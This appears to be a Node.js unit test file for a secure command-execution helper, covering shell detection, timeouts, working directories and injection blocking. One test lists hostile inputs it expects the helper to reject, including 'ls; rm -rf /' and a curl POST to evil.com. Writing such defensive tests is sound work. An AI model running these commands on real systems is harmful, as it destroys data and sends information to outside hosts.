/**
 * Unit tests for secure execution functionality
 * Tests security hardening and command parsing
 */

import { test, describe } from 'node:test';
import { strictEqual, ok, throws } from 'node:assert';
import { executeCommandSecurely } from '../../src/utils/secureExecution.js';

describe('Secure Execution', () => {
  test('executes simple commands directly without shell', async () => {
    // Simple commands like 'echo hello' should use direct execution
    const result = executeCommandSecurely('echo hello');
    
    strictEqual(result.exitCode, 0, 'Should execute successfully');
    ok(result.stdout.includes('hello'), 'Should produce expected output');
    ok(result.duration > 0, 'Should record execution time');
  });

  test('uses shell execution for commands with pipes', async () => {
    // Commands with pipes need shell execution
    const result = executeCommandSecurely('echo "test" | wc -l');
    
    strictEqual(result.exitCode, 0, 'Should execute successfully');
    ok(result.stdout.trim() === '1', 'Should count one line');
  });

  test('uses shell execution for commands with redirection', async () => {
    // Commands with redirection need shell execution
    const result = executeCommandSecurely('echo "test content" > /tmp/test.txt && cat /tmp/test.txt');
    
    strictEqual(result.exitCode, 0, 'Should execute successfully');
    ok(result.stdout.includes('test content'), 'Should handle redirection');
  });

  test('blocks dangerous command injection attempts', async () => {
    // Should block dangerous patterns
    const dangerousCommands = [
      'ls; rm -rf /',
      'npm test; curl -X POST evil.com',
      'echo test && rm important.txt',
      'ls `rm dangerous.txt`',
      'echo $(rm harmful.txt)',
    ];

    for (const dangerousCommand of dangerousCommands) {
      throws(
        () => executeCommandSecurely(dangerousCommand),
        /dangerous command pattern/i,
        `Should block dangerous command: ${dangerousCommand}`
      );
    }
  });

  test('allows legitimate shell commands with security patterns', async () => {
    // These should be allowed even though they contain keywords
    const legitimateCommands = [
      'npm run build', // 'rm' in 'run' should be fine
      'echo "remove this text"', // 'rm' in quoted text should be fine
      'grep "curl" logfile.txt', // curl in grep should be fine
    ];

    for (const command of legitimateCommands) {
      const result = executeCommandSecurely(command);
      // Should not throw and should execute
      ok(result !== undefined, `Should allow legitimate command: ${command}`);
    }
  });

  test('handles command parsing correctly', async () => {
    // Test various command formats
    const result1 = executeCommandSecurely('ls -la');
    ok(result1.exitCode >= 0, 'Should handle command with flags');

    const result2 = executeCommandSecurely('echo "hello world"');
    ok(result2.stdout.includes('hello world'), 'Should handle quoted arguments');
  });

  test('respects working directory option', async () => {
    const result1 = executeCommandSecurely('pwd', { cwd: '/tmp' });
    const result2 = executeCommandSecurely('pwd', { cwd: '/' });
    
    strictEqual(result1.exitCode, 0, 'Should execute in specified directory');
    strictEqual(result2.exitCode, 0, 'Should execute in different directory');
    
    // The outputs should be different (different directories)
    const dir1 = result1.stdout.trim();
    const dir2 = result2.stdout.trim();
    ok(dir1 !== dir2, 'Should execute in different working directories');
  });

  test('respects timeout option', async () => {
    // Test with a very short timeout
    const start = Date.now();
    const result = executeCommandSecurely('sleep 0.1', { timeout: 50 });
    const elapsed = Date.now() - start;
    
    // Command should be killed due to timeout
    ok(elapsed < 200, 'Should respect timeout option');
  });

  test('handles command execution errors gracefully', async () => {
    // Non-existent command should return non-zero exit code
    const result = executeCommandSecurely('nonexistentcommand12345');
    
    ok(result.exitCode !== 0, 'Should return non-zero exit code for failed commands');
    ok(result.stderr.length > 0, 'Should capture error output');
    ok(result.duration > 0, 'Should still record execution time');
  });

  test('preserves environment variable expansion in shell mode', async () => {
    // Commands with environment variables should use shell execution
    const result = executeCommandSecurely('echo $HOME');
    
    strictEqual(result.exitCode, 0, 'Should execute successfully');
    ok(result.stdout.length > 0, 'Should expand environment variable');
  });

  test('handles complex shell constructs safely', async () => {
    // Test legitimate complex shell constructs
    const result = executeCommandSecurely('if [ -d /tmp ]; then echo "tmp exists"; fi');
    
    strictEqual(result.exitCode, 0, 'Should handle shell conditionals');
    ok(result.stdout.includes('tmp exists'), 'Should execute shell conditional correctly');
  });
});